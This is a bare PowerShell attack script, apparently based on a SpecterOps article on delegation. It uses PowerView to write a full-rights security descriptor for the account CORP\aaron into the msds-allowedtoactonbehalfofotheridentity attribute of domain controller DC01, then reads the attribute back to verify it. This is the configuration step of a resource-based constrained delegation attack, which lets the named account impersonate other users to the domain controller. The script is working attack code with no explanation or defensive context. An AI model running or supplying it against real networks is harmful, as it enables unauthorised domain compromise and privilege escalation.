# 参考文章
# https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a

$target_user     = "CORP\aaron"
$target_computer = "DC01.corp.aaron.com"

# translate the identity to a security identifier
$user = New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $target_user
$sid  = ($user.Translate([System.Security.Principal.SecurityIdentifier])).Value

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set
Get-DomainComputer $target_computer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# get
$RawBytes = Get-DomainComputer $target_computer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier


